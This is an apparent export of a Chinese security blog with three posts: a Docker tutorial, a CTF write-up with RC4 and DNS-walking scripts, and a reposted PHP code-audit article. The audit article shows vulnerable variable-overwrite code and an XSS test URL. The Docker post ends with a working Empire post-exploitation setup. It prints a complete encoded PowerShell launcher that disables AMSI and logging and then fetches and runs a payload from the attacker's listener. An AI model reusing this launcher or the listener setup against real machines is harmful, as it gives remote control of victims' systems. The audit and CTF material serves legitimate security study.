"while true ; do echo zeroyu ; sleep 1 ; done"88f12c0725a466ba6d8f08f34fc8e9ac263ecafdff0a9e7282d7e9bb4073e6a0➜ ~ docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES88f12c0725a4 kalilinux:0.1 "/bin/sh -c 'while..." 7 seconds ago Up 7 seconds sleepy_kowalevski➜ ~ docker logs 88f12c0725a4zeroyuzeroyuzeroyu...... 2.终止容器123456789101112131415#id为88f12c0725a4但是可以使用前几位来简单表示➜ ~ docker stop 8888#查看所有处于终止态的id➜ ~ docker ps -qa073ff4e1dac7#处于终止状态可以使用start来重新启动➜ ~ docker start 073073➜ ~ docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES073ff4e1dac7 kalilinux:0.1 "/bin/sh -c 'while..." About a minute ago Up About a minute cranky_benz#restart可以先终止再重新启动➜ ~ docker restart 073073 3.进入容器处于守护态（-d参数）的容器会在后台运行，但是你无法到信息，也无法进行操作。此时，要进入容器进行工作，要使用attach或者exec命令。 1） 使用attach命令 12345678#容器还可以使用name来唯一辨识➜ ~ docker run -itd kalilinux:0.177e93d18a6a547c85d86925a0bf3c4ae734eec6fe235ae1c3fe0f19822f14360➜ ~ docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES77e93d18a6a5 kalilinux:0.1 "/bin/bash" 20 seconds ago Up 21 seconds stupefied_gates➜ ~ docker attach stupefied_gatesroot@77e93d18a6a5:/# 2）使用exec命令 1234567➜ ~ docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES77e93d18a6a5 kalilinux:0.1 "/bin/bash" 5 minutes ago Exited (0) About a minute ago stupefied_gates➜ ~ docker start 77e77e➜ ~ docker exec -it 77e93d18a6a5 /bin/bashroot@77e93d18a6a5:/# 4.删除容器123456789➜ ~ docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES77e93d18a6a5 kalilinux:0.1 "/bin/bash" 7 minutes ago Up About a minute stupefied_gates➜ ~ docker rm 77e93d18a6a5Error response from daemon: You cannot remove a running container 77e93d18a6a547c85d86925a0bf3c4ae734eec6fe235ae1c3fe0f19822f14360. Stop the container before attempting removal or force remove➜ ~ docker stop 77e93d18a6a577e93d18a6a5➜ ~ docker rm 77e93d18a6a577e93d18a6a5 5.导入和导出容器12345678#导出容器#无论这个容器是否正在运行都是可以导出的➜ ~ docker export -o test.tar 77e93d18a6a5#或者执行➜ ~ docker export 77e93d18a6a5 &gt; test.tar #导入容器➜ ~ docker import test.tar - test/kalilinux:v1.0 Docker数据管理1234567891011121314#使用-v标记挂在本地的tmp目录到容器中的/opt/tmp_test#使用rw（默认也是这种方式）来指定可读写#下面的#表示的不是注释➜ ~ docker run -it -P --name db -v /tmp:/opt/tmp_test:rw kalilinux:0.1 /bin/sh# lsbin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var# cd opt# lstmp_test# cd tmp_test# lscom.apple.launchd.0fGM76e6ao com.apple.launchd.UWfVYRXkwo powerlogcom.apple.launchd.AkQGotnulN pip-FfQw68-unpack zeroyu.txt# Docker端口映射123456789101112#-P是指映射到任意端口#-p加端口号(本地端口:远程端口=&gt;0.0.0.0:8080:80)，则将端口映射到所有地址的相应端口➜ ~ docker run -it -d -p 5000:5000 kalilinux:v0.223e91a40cb124720b1dba81371a275169124cbff2778120b4350470fa79a0d91➜ ~ docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES23e91a40cb12 kalilinux:v0.2 "/bin/bash" 12 seconds ago Up 11 seconds 0.0.0.0:5000-&gt;5000/tcp boring_volhard➜ ~ docker attach boring_volhardroot@23e91a40cb12:/# cd home/Empire/root@23e91a40cb12:/home/Empire# lsLICENSE README.md changelog data empire lib setuproot@23e91a40cb12:/home/Empire# DockerfileDockerfile基本语句的说明12345678910111213141516171819FROM &lt;image:版本标签&gt;：该 image 文件继承某个镜像 image，冒号表示标签，这里标签是8.4，即8.4版本的 node。MAINTAINER &lt;name&gt; &lt;email&gt; :描述镜像的创建者，名称和邮箱COPY .[directory]：将当前目录下的所有文件（除了.dockerignore排除的路径），都拷贝进入 image 文件的 directory 目录。ADD 源路径 目标路径 :将主机构建环境（上下文）目录中的文件和目录、以及一个URL标记的文件 拷贝到镜像中。与COPY相比ADD可以自动解压，也可以复制网络文件。路径不存在会自动创建。WORKDIR [directory]：指定接下来的工作路径为 directory。RUN [cmd]：在/app目录下，运行[cmd]命令安装依赖。注意，安装后所有的依赖，都将打包进入 image 文件。EXPOSE [port]：将容器 port 端口暴露出来， 允许外部连接这个端口。在docker run -p的时候生效。VOLUME ["path"] : 在主机上创建一个挂载，挂载到容器的指定路径。docker run -v命令也能完成这个操作，而且更强大。这个命令不能指定主机的需要挂载到容器的文件夹路径。但docker run -v可以，而且其还可以挂载数据容器。CMD [cmd]：在容器启动后自动执行 [cmd] 命令(只会出现一次)EVN &lt;key&gt; &lt;value&gt; : 只能设置一个，设置容器的环境变量，可以让其后面的RUN命令使用，容器运行的时候这个变量也会保留。 CTF中的Dockerfile实例展示12345678910111213141516171819202122232425262728293031323334353637383940414243444546#Hitcon 2017 web baby^h-master-php-2017##read_secret输出OrangeOrangeOrange#MaxConnectionsPerChild为100#其余环境与题目大致无异#如要修改root与题目用户密码请用 [docker exec -it '你的应用名称' /bin/bash] 进入容器修改#整合 apache php7FROM pr0ph3t/lap7MAINTAINER Pr0ph3t &lt;1415314884@qq.com&gt;#Install crontab and perl with LWPRUN apt-get update -y &amp;&amp; apt-get install cron -y#Init crontab , 每天凌晨4点清空data文件夹RUN echo '0 4 * * * root rm -rf /var/www/data/*' &gt;&gt; /etc/crontab#Init challengeADD index.php /var/www/html/ADD readflag /read_flagADD read_secret /read_secretADD avatar-1.gif /var/www/html/avatar.gifRUN chmod u+s /read_flagRUN rm -rf /var/www/html/index.htmlRUN mkdir /var/www/dataRUN chown www-data /var/www/dataRUN chmod -R 775 /var/www/dataRUN echo 'hitcon&#123;Th3 d4rk fl4m3 PHP Mast3r&#125;' &gt; /flagRUN chmod 700 /flag#Configure the apache2RUN sed 's/Indexes //' /etc/apache2/apache2.conf &gt; /etc/apache2/apache2.conf.newRUN sed 's/MaxConnectionsPerChild 0/MaxConnectionsPerChild 100/' /etc/apache2/mods-available/mpm_prefork.conf &gt; /etc/apache2/mods-available/mpm_prefork.conf.newRUN mv /etc/apache2/apache2.conf.new /etc/apache2/apache2.confRUN mv /etc/apache2/mods-available/mpm_prefork.conf.new /etc/apache2/mods-available/mpm_prefork.confRUN echo '&lt;Directory "/var/www/data"&gt;\n\tphp_flag engine off\n&lt;/Directory&gt;' &gt;&gt; /etc/apache2/sites-enabled/000-default.conf#Create run.shADD run.sh /RUN chmod +x /run.sh#Expose http serviceEXPOSE 80CMD ["bash -x /run.sh"] Dockerfile的使用方式123进入Dockerfile目录[docker build -t &apos;自定义镜像名字&apos; . ] //最后的.别少了[docker run -id --name &apos;你的应用名称&apos; -p 外部端口:80 -m &apos;内存限制 如1g、500m&apos; &apos;你的自定义镜像名称&apos; /run.sh] 附例在vps中的docker上使用empire进行渗透测试(metasploit同理) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158#端口映射参考上条================================================================ [Empire] Post-Exploitation Framework================================================================ [Version] 2.3 | [Web] https://github.com/empireProject/Empire================================================================ _______ .___ ___. .______ __ .______ _______ | ____|| \/ | | _ \ | | | _ \ | ____| | |__ | \ / | | |_) | | | | |_) | | |__ | __| | |\/| | | ___/ | | | / | __| | |____ | | | | | | | | | |\ \----.| |____ |_______||__| |__| | _| |__| | _| `._____||_______| 282 modules currently loaded 0 listeners currently active 0 agents currently active(Empire) &gt; helpCommands========agents Jump to the Agents menu.creds Add/display credentials to/from the database.exit Exit Empirehelp Displays the help menu.interact Interact with a particular agent.list Lists active agents or listeners.listeners Interact with active listeners.load Loads Empire modules from a non-standard folder.preobfuscate Preobfuscate PowerShell module_source filesreload Reload one (or all) Empire modules.reset Reset a global option (e.g. IP whitelists).resource Read and execute a list of Empire commands from a file.searchmodule Search Empire module names/descriptions.set Set a global option (e.g. IP whitelists).show Show a global option (e.g. IP whitelists).usemodule Use an Empire module.usestager Use an Empire stager.(Empire) &gt; list(Empire) &gt; listeners[!] No listeners currently active(Empire: listeners) &gt; uselistener http(Empire: listeners/http) &gt; info Name: HTTP[S]Category: client_serverAuthors: @harmj0yDescription: Starts a http[s] listener (PowerShell or Python) that uses a GET/POST approach.HTTP[S] Options: Name Required Value Description ---- -------- ------- ----------- SlackToken False Your SlackBot API token to communicate with your Slack instance. ProxyCreds False default Proxy credentials ([domain\]username:password) to use for request (default, none, or other). KillDate False Date for the listener to exit (MM/dd/yyyy). Name True http Name for the listener. Launcher True powershell -noP -sta -w 1 -enc Launcher string. DefaultDelay True 5 Agent delay/reach back interval (in seconds). DefaultLostLimit True 60 Number of missed checkins before exiting WorkingHours False Hours for the agent to operate (09:00-17:00). SlackChannel False #general The Slack channel or DM that notifications will be sent to. DefaultProfile True /admin/get.php,/news.php,/login/ Default communication profile for the agent. process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko Host True http://172.17.0.2:80 Hostname/IP for staging. CertPath False Certificate path for https listeners. DefaultJitter True 0.0 Jitter in agent reachback interval (0.0-1.0). Proxy False default Proxy to use for request (default, none, or other). UserAgent False default User-agent string to use for the staging request (default, none, or other). StagingKey True 3ab47284cf7e260541d810beb54d3405 Staging key for initial agent negotiation. BindIP True 0.0.0.0 The IP to bind to on the control server. Port True 80 Port for the listener. ServerVersion True Microsoft-IIS/7.5 Server header for the control server. StagerURI False URI for the stager. Must use /download/. Example: /download/stager.php(Empire: listeners/http) &gt; set Name docker#此处的172.16.188.1为vps的ip地址(Empire: listeners/http) &gt; set Host http://172.16.188.1:5000(Empire: listeners/http) &gt; execute[*] Starting listener 'docker'[+] Listener successfully started!(Empire: listeners/http) &gt; lsit*** Unknown syntax: lsit(Empire: listeners/http) &gt; back(Empire: listeners) &gt; list[*] Active listeners: Name Module Host Delay/Jitter KillDate ---- ------ ---- ------------ -------- docker http http://172.16.188.1:5000 5/0.0(Empire: listeners) &gt; usestagermulti/bash osx/dylib osx/teensy windows/launcher_sctmulti/launcher osx/jar windows/bunny windows/launcher_vbsmulti/pyinstaller osx/launcher windows/dll windows/macromulti/war osx/macho windows/ducky windows/macroless_mswordosx/applescript osx/macro windows/hta windows/teensyosx/application osx/pkg windows/launcher_batosx/ducky osx/safari_launcher windows/launcher_lnk(Empire: listeners) &gt; usestager windows/ddll ducky(Empire: listeners) &gt; usestager windows/dll(Empire: stager/windows/dll) &gt; infoName: DLL LauncherDescription: Generate a PowerPick Reflective DLL to inject with stager code.Options: Name Required Value Description ---- -------- ------- ----------- Listener True Listener to use. ProxyCreds False default Proxy credentials ([domain\]username:password) to use for request (default, none, or other). Obfuscate False False Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only. Proxy False default Proxy to use for request (default, none, or other). Language True powershell Language of the stager to generate. OutFile True /tmp/launcher.dll File to output dll to. UserAgent False default User-agent string to use for the staging request (default, none, or other). Arch True x64 Architecture of the .dll to generate (x64 or x86). ObfuscateCommand False Token\All\1 The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only. StagerRetries False 0 Times for the stager to retry connecting.(Empire: stager/windows/dll) &gt; set Listener docker(Empire: stager/windows/dll) &gt; back(Empire: listeners) &gt; launcher powershell dockerpowershell -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAFIAcwBpAE8AbgBUAEEAYgBMAEUALgBQAFMAVgBFAHIAcwBJAE8ATgAuAE0AQQBKAE8AUgAgAC0ARwBlACAAMwApAHsAJABHAFAAUwA9AFsAUgBFAGYAXQAuAEEAcwBzAEUATQBCAGwAWQAuAEcARQBUAFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAVABGAEkARQBgAGwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4ARwBFAFQAVgBBAGwAdQBlACgAJABOAFUAbABsACkAOwBJAGYAKAAkAEcAUABTAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQARwBQAFMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAA7ACQARwBQAFMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0ARQBMAHMAZQB7AFsAUwBDAHIAaQBQAFQAQgBsAG8AYwBrAF0ALgAiAEcARQBUAEYASQBFAGAAbABEACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEAbAB1AEUAKAAkAG4AVQBsAGwALAAoAE4AZQBXAC0ATwBCAGoAZQBDAFQAIABDAG8ATABsAEUAYwBUAGkAbwBOAHMALgBHAEUATgBlAFIAaQBDAC4ASABBAHMASABTAEUAVABbAFMAdAByAEkAbgBHAF0AKQApAH0AWwBSAEUAZgBdAC4AQQBzAFMARQBtAEIATAB5AC4ARwBFAFQAVAB5AFAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAGUAVABGAEkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUAZQAoACQAbgB1AGwAbAAsACQAVABSAHUAZQApAH0AOwB9ADsAWwBTAFkAcwB0AEUAbQAuAE4ARQB0AC4AUwBFAFIAdgBpAEMAZQBQAG8ASQBOAFQATQBBAG4AYQBnAEUAcgBdADoAOgBFAFgAcABlAEMAVAAxADAAMABDAE8AbgB0AGkAbgBVAEUAPQAwADsAJAB3AEMAPQBOAGUAVwAtAE8AQgBqAGUAQwB0ACAAUwB5AFMAVABlAE0ALgBOAGUAVAAuAFcARQBiAEMATABJAEUAbgBUADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7ACQAdwBDAC4ASABFAGEAZABlAHIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAVwBjAC4AUAByAE8AWABZAD0AWwBTAFkAUwB0AGUAbQAuAE4AZQB0AC4AVwBFAGIAUgBFAFEAVQBlAFMAVABdADoAOgBEAEUAZgBBAHUAbABUAFcAZQBCAFAAcgBPAFgAeQA7ACQAdwBDAC4AUABSAG8AWABZAC4AQwByAGUAZABFAG4AdABpAGEATABzACAAPQAgAFsAUwBZAFMAdABlAE0ALgBOAGUAVAAuAEMAcgBlAGQAZQBuAFQASQBhAGwAQwBhAGMASABlAF0AOgA6AEQAZQBGAGEAVQBMAFQATgBFAFQAVwBvAHIASwBDAHIAZQBEAEUATgB0AEkAYQBMAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQAdwBjAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwB0AGUATQAuAFQAZQB4AFQALgBFAE4AQwBPAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgBZAFQAZQBTACgAJwAzAGEAYgA0ADcAMgA4ADQAYwBmADcAZQAyADYAMAA1ADQAMQBkADgAMQAwAGIAZQBiADUANABkADMANAAwADUAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAUgBnAFMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AdQBOAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgBYAG8AUgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJABzAGUAcgA9ACcAaAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADEAOAA4AC4AMQA6ADUAMAAwADAAJwA7ACQAdAA9ACcALwBuAGUAdwBzAC4AcABoAHAAJwA7ACQAVwBjAC4ASABFAEEAZABlAHIAUwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0AUgAvAGoAMwAxAEkAYwBRAGQAZQAzAEYANwB2AGoAWABYADIAbgBwADYARQAyAFcAcQBiAGMAPQAiACkAOwAkAEQAYQBUAEEAPQAkAFcAQwAuAEQAbwBXAE4AbABvAEEARABEAGEAVABBACgAJABzAEUAcgArACQAdAApADsAJABpAHYAPQAkAEQAQQBUAGEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAQQB0AGEAWwA0AC4ALgAkAEQAQQB0AGEALgBsAGUATgBHAHQASABdADsALQBKAE8AaQBuAFsAQwBIAEEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAQQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==#在目标机器上执行上面的payload就可以得到下面的反弹(Empire: listeners) &gt; [+] Initial agent G3BYNCLW from 172.17.0.1 now active (Slack)]]></content>
  </entry>
  <entry>
    <title><![CDATA[EIS 2017 DNS101题解]]></title>
    <url>%2F2017%2F11%2F02%2FEIS-2017-MISC%E9%A2%98%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[前言今天跟大佬们在做EIS 2017运维挑战赛，我看的时候大佬们已经把web做的差不多了。所以我就来解决两道MISC。 RC4第一个是rc4的一个解密，挺简单的，手撸一个解密代码。 12345678910111213141516171819# -*- coding: utf-8 -*-#密文：下面十六进制的一串；密钥：hello worlddef rc4(data,key): j=0 s=range(256) for i in range(256): j=(j+s[i]+ord(key[i%len(key)]))%256 s[i],s[j]=s[j],s[i] i=0 j=0 out=[] for char in data: i=(i+1)%256 j=(j+s[i])%256 s[i],s[j]=s[j],s[i] out.append(chr(ord(char)^s[(s[i]+s[j])%256])) return ''.join(out)encodedata=rc4('\xCA\xEE\x86\x30\x48\xC4\xEC\x56\x3D\x22\x2A\xBC\x9A\x95\x70\x23\x39\x76\x3B\xEE\x09\x29\x2B\x01\x54\x00\x87\x5E\x37\x23\x3E\x79\x8B\x7B\xA9\x20\x78','hello world')print encodedata DNS 101这个题我是懵逼了一上午，dig了一早上TXT没想到玄机在与NSEC(DNSSEC 的一部分 — 用来验证一个未存在的服务器，使用与 NXT（已过时）记录的格式)。还有一点就是dig any的用法，这个当时也是没有考虑到。（多谢rebirth的指点） 12345678910111213141516171819202122# -*- coding: utf-8 -*-import reimport subprocesstarget = 'what.is.my.flag.src.edu-info.edu.cn'while 1: output = subprocess.Popen(['dig any'+' '+target],stdout=subprocess.PIPE,shell=True).communicate() #print output[0] result = re.findall(".*NSEC(.*). TXT.*",output[0]) print result[0].strip() target = result[0].strip() flag = subprocess.Popen(['dig'+' '+target+' '+'TXT'],stdout=subprocess.PIPE,shell=True).communicate() #EIS&#123;&#125;是flag的格式 if 'EIS' in flag[0]: print flag[0] break 最终结果：]]></content>
  </entry>
  <entry>
    <title><![CDATA[[转载]高级PHP应用程序漏洞审核技术]]></title>
    <url>%2F2017%2F10%2F31%2F%E8%BD%AC%E8%BD%BD-%E9%AB%98%E7%BA%A7PHP%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%BC%8F%E6%B4%9E%E5%AE%A1%E6%A0%B8%E6%8A%80%E6%9C%AF%2F</url>
    <content type="text"><![CDATA[前言PHP是一种被广泛使用的脚本语言，尤其适合于web开发。具有跨平台，容易学习，功能强大等特点，据统计全世界有超过34%的网站有php的应用，包括Yahoo、sina、163、sohu等大型门户网站。而且很多具名的web应用系统（包括bbs,blog,wiki,cms等等）都是使用php开发的，Discuz、phpwind、phpbb、vbb、wordpress、boblog等等。 随着web安全的热点升级，php应用程序的代码安全问题也逐步兴盛起来，越来越多的安全人员投入到这个领域，越来越多的应用程序代码漏洞被披露。针对这样一个状况，很多应用程序的官方都成立了安全部门，或者雇佣安全人员进行代码审计，因此出现了很多自动化商业化的代码审计工具。 也就是这样的形势导致了一个局面：大公司的产品安全系数大大的提高，那些很明显的漏洞基本灭绝了，那些大家都知道的审计技术都无用武之地了。我们面对很多工具以及大牛扫描过n遍的代码，有很多的安全人员有点悲观，而有的官方安全人员也非常的放心自己的代码，但是不要忘记了“没有绝对的安全”，我们应该去寻找新的途径挖掘新的漏洞。本文就给介绍了一些非传统的技术经验和大家分享。 另外在这里特别说明一下本文里面很多漏洞都是来源于网络上牛人和朋友们的分享，在这里需要感谢他们 ：） 传统的代码审计技术WEB应用程序漏洞查找基本上是围绕两个元素展开：变量与函数。也就是说一漏洞的利用必须把你提交的恶意代码通过变量经过n次变量转换传递，最终传递给目标函数执行，还记得MS那句经典的名言吗？“一切输入都是有害的”。这句话只强调了变量输入，很多程序员把“输入”理解为只是gpc[$_GET,$_POST,$_COOKIE]，但是变量在传递过程产生了n多的变化。导致很多过滤只是个“纸老虎”！我们换句话来描叙下代码安全：“一切进入函数的变量是有害的”。 PHP代码审计技术用的最多也是目前的主力方法：静态分析，主要也是通过查找容易导致安全漏洞的危险函数，常用的如grep，findstr等搜索工具，很多自动化工具也是使用正则来搜索这些函数。下面列举一些常用的函数，也就是下文说的字典（暂略）。但是目前基本已有的字典很难找到漏洞，所以我们需要扩展我们的字典，这些字典也是本文主要探讨的。 其他的方法有：通过修改PHP源代码来分析变量流程，或者hook危险的函数来实现对应用程序代码的审核，但是这些也依靠了我们上面提到的字典。 PHP版本与应用代码审计到目前为止，PHP主要有3个版本：php4、php5、php6，使用比例大致如下： 版本 占比 说明 php4 68% 2000-2007，No security fixes after 2008/08，最终版本是php4.4.9 php5 32% 2004-present，Now at version 5.2.6（PHP 5.3 alpha1 released!） php6 目前还在测试阶段，变化很多做了大量的修改，取消了很多安全选项如magic_quotes_gpc 由于php缺少自动升级的机制，导致目前PHP版本并存，也导致很多存在漏洞没有被修补。这些有漏洞的函数也是我们进行WEB应用程序代码审计的重点对象，也是我们字典重要来源。 其他的因素与应用代码审计很多代码审计者拿到代码就看，他们忽视了“安全是一个整体”，代码安全很多的其他因素有关系，比如上面我们谈到的PHP版本的问题，比较重要的还有操作系统类型（主要是两大阵营win/*nix），WEB服务端软件（主要是iis/apache两大类型）等因素。这是由于不同的系统不同的WEB SERVER有着不同的安全特点或特性，下文有些部分会涉及。 所以我们在做某个公司WEB应用代码审计时，应该了解他们使用的系统，WEB服务端软件，PHP版本等信息。 扩展我们的字典下面将详细介绍一些非传统PHP应用代码审计一些漏洞类型和利用技巧。 变量本身的key 说到变量的提交很多人只是看到了GET/POST/COOKIE等提交的变量的值，但是忘记了有的程序把变量本身的key也当变量提取给函数处理。 12345678&lt;?php//key.php?aaaa'aaa=1&amp;bb'b=2 //print_R($_GET); foreach ($_GET AS $key =&gt; $value)&#123; print $key."\n";&#125;?&gt; 上面的代码就提取了变量本身的key显示出来，单纯对于上面的代码，如果我们提交URL： 1key.php?&lt;script&gt;alert(1);&lt;/script&gt;=1&amp;bbb=2 那么就导致一个xss的漏洞，扩展一下如果这个key提交给include()等函数或者sql查询呢？：） 漏洞审计策略 PHP版本要求 : 无 系统要求 : 无 审计策略 : 通读代码 变量覆盖 很多的漏洞查找者都知道extract()这个函数在指定参数为EXTR_OVERWRITE或者没有指定函数可以导致变量覆盖，但是还有很多其他情况导致变量覆盖的如： 遍历初始化变量请看如下代码： 12345678&lt;?php//var.php?a=fuck$a='hi';foreach($_GET as $key =&gt; $value) &#123; $$key = $value;&#125;print $a;?&gt; 很多的WEB应用都使用上面的方式（注意循环不一定是foreach），如Discuz!4.1的WAP部分的代码： 1234567$chs = '';if($_POST &amp;&amp; $charset != 'utf-8') &#123; $chs = new Chinese('UTF-8', $charset); foreach($_POST as $key =&gt; $value) &#123; $$key = $chs-&gt;Convert($value); &#125; unset($chs); 漏洞审计策略 PHP版本要求：无 系统要求：无 审计策略：通读代码 parse_str()变量覆盖漏洞1234//var.php?var=new$var = 'init'; parse_str($_SERVER['QUERY_STRING']); print $var; 该函数一样可以覆盖数组变量，上面的代码是通过$_SERVER[‘QUERY_STRING’]来提取变量的，对于指定了变量名的我们可以通过注射“=”来实现覆盖其他的变量： 1234//var.php?var=1&amp;a[1]=var1%3d222$var1 = 'init';parse_str($a[$_GET['var']]);print $var1; 上面的代码通过提交$var来实现对$var1的覆盖。 漏洞审计策略（parse_str） PHP版本要求：无 系统要求：无 审计策略：查找字符parse_str 漏洞审计策略（mb_parse_str） PHP版本要求：php4&lt;4.4.7 php5&lt;5.2.2 系统要求：无 审计策略：查找字符mb_parse_str import_request_variables()变量覆盖漏洞12345//var.php?_SERVER[REMOTE_ADDR]=10.1.1.1echo 'GLOBALS '.(int)ini_get("register_globals")."n";import_request_variables('GPC');if ($_SERVER['REMOTE_ADDR'] != '10.1.1.1') die('Go away!');echo 'Hello admin!'; 漏洞审计策略（import_request_variables） PHP版本要求：php4&lt;4.4.1 php5&lt;5.2.2 系统要求：无 审计策略：查找字符import_request_variables PHP5 Globals从严格意义上来说这个不可以算是PHP的漏洞，只能算是一个特性，测试代码： 12345&lt;?php//register_globals = &apos;ON&apos;//foo.php?GLOBALS[foobar]=HELLOecho $foobar; ?&gt; 但是很多的程序没有考虑到这点，请看如下代码： 12345//为了安全取消全局变量//var.php?GLOBALS[a]=aaaa&amp;b=111if (ini_get('register_globals')) foreach($_REQUEST as $k=&gt;$v) unset($&#123;$k&#125;);print $a;print $_GET[b]; 如果熟悉WEB2.0的攻击的同学，很容易想到上面的代码我们可以利用这个特性进行crsf攻击。 漏洞审计策略 PHP版本要求：无 系统要求：无 审计策略：通读代码 magic_quotes_gpc与代码安全 什么是magic_quotes_gpc当打开时，所有的 ‘（单引号），”（双引号），\（反斜线）和 NULL 字符都会被自动加上一个反斜线进行转义。还有很多函数有类似的作用 如：addslashes()、mysql_escape_string()、mysql_real_escape_string()等，另外还有parse_str()后的变量也受magic_quotes_gpc的影响。目前大多数的主机都打开了这个选项，并且很多程序员也注意使用上面那些函数去过滤变量，这看上去很安全。很多漏洞查找者或者工具遇到些函数过滤后的变量直接就放弃，但是就在他们放弃的同时也放过很多致命的安全漏洞。 ：） 哪些地方没有魔术引号的保护1) $_SERVER变量 PHP5的$_SERVER变量缺少magic_quotes_gpc的保护，导致近年来X-Forwarded-For的漏洞猛暴，所以很多程序员考虑过滤X-Forwarded-For，但是其他的变量呢？ 漏洞审计策略（$_SERVER变量） PHP版本要求：无 系统要求：无 审计策略：查找字符_SERVER 2) getenv()得到的变量（使用类似$_SERVER变量） 漏洞审计策略（getenv()） PHP版本要求：无 系统要求：无 审计策略：查找字符getenv 3) $HTTP_RAW_POST_DATA与PHP输入、输出流 主要应用与soap/xmlrpc/webpublish功能里，请看如下代码： 12345if ( !isset( $HTTP_RAW_POST_DATA ) ) &#123; $HTTP_RAW_POST_DATA = file_get_contents( 'php://input' );&#125;if ( isset($HTTP_RAW_POST_DATA) ) $HTTP_RAW_POST_DATA = trim($HTTP_RAW_POST_DATA); 漏洞审计策略（数据流） PHP版本要求：无 系统要求：无 审计策略：查找字符HTTP_RAW_POST_DATA或者php://input 4) 数据库操作容易忘记’的地方如：in()/limit/order by/group by 如Discuz!&lt;5.0的pm.php：​ 1234567891011if(is_array($msgtobuddys)) &#123; $msgto = array_merge($msgtobuddys, array($msgtoid)); ......foreach($msgto as $uid) &#123; $uids .= $comma.$uid; $comma = ',';&#125;......$query = $db-&gt;query("SELECT m.username, mf.ignorepm FROM &#123;$tablepre&#125;members m LEFT JOIN &#123;$tablepre&#125;memberfields mf USING(uid) WHERE m.uid IN ($uids)"); 